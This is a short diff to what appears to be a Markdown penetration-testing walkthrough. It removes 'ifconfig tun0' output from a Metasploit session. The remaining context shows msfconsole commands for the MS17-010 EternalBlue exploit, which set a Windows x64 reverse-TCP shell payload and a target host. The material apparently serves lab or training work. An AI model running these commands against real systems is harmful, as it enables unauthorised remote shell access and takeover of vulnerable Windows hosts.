@@ -701,18 +701,6 @@ show options
 **Result**
 
 ```shell
-msf exploit(windows/smb/ms17_010_eternalblue) > ifconfig tun0
-[*] exec: ifconfig tun0
-
-tun0: flags=209<UP,POINTOPOINT,RUNNING,NOARP>  mtu 1380
-        inet 192.168.134.39  netmask 255.255.192.0  destination 192.168.134.39
-        inet6 fe80::aaa6:5df4:6fb5:a3df  prefixlen 64  scopeid 0x20<link>
-        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
-        RX packets 1029  bytes 41200 (40.2 KiB)
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 1759  bytes 247988 (242.1 KiB)
-        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
-
 msf exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
 payload => windows/x64/shell/reverse_tcp
 msf exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.48.181.153
